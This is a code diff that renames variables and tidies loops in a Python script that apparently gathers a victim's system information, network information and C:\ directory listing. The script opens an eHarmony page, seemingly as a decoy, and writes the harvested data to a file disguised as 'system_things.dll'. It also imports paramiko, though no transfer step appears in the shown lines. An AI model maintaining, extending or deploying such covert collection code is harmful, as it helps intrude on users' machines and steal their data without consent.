@@ -13,9 +13,9 @@ def install_dependencies():
 install_dependencies()
 import paramiko
 
-sysList = []
-dataList = []
-dirList = []
+sys_list = []
+data_list = []
+dir_list = []
 
 def open_browser():
     # OPENS EHARMONY WEBSITE
@@ -34,7 +34,7 @@ def get_system_info():
     for line in ID.splitlines():
         cleaned = line.strip()
         if cleaned:
-            sysList.append(cleaned)
+            sys_list.append(cleaned)
             print(cleaned)
 
 def get_network_info():
@@ -50,7 +50,7 @@ def get_network_info():
     for line in data.splitlines():
         cleaned = line.strip()
         if cleaned:
-            dataList.append(cleaned)
+            data_list.append(cleaned)
             print(cleaned)
 
 def get_directories():
@@ -59,24 +59,23 @@ def get_directories():
     print()
     DIR = os.listdir(r'C:\\')
 
-    for item in DIR:
-        dirList.append(str(item.split('\r')))
-    for i in dirList:
-        print(i[2:-2])
+    for line in DIR:
+        dir_list.append(line)
+        print(line)
 
 def write_to_file():
     # CREATES AND WRITES INFO TO .DLL FILE IN DIRECTORY
     f = open('system_things.dll', 'w')
     f.write('<<SYSTEM INFORMATION>> \n\n')
-    for itemFile in sysList:
+    for itemFile in sys_list:
         f.write(itemFile + '\n')
     f.write('\n\n')
     f.write('<<NETWORK INFORMATION>> \n\n')
-    for itemFile in dataList:
+    for itemFile in data_list:
         f.write(itemFile + '\n')
     f.write('\n\n')
     f.write('<<C:\\ DIRECTORIES>> \n\n')
-    for itemFile in dirList:
+    for itemFile in dir_list:
         f.write(itemFile + '\n')
     f.close()
 
